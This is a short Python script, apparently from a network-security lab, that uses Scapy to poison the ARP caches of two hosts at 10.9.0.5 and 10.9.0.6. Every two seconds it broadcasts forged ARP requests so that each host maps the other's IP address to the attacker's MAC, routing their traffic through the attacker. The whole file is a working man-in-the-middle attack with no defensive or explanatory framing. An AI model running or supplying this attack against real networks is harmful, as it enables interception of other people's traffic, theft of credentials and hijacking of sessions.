#!/usr/bin/env python3
# Continuously poison A and B so their traffic to each other flows through M.
from scapy.all import *
import time

IP_A = '10.9.0.5'
IP_B = '10.9.0.6'
mac_M = get_if_hwaddr('eth0')

# request-form ARP updates the sender's entry in an existing cache regardless of state
to_A = Ether(src=mac_M, dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, hwsrc=mac_M, psrc=IP_B, pdst=IP_A)
to_B = Ether(src=mac_M, dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, hwsrc=mac_M, psrc=IP_A, pdst=IP_B)
while True:
    sendp(to_A, verbose=0)
    sendp(to_B, verbose=0)
    time.sleep(2)
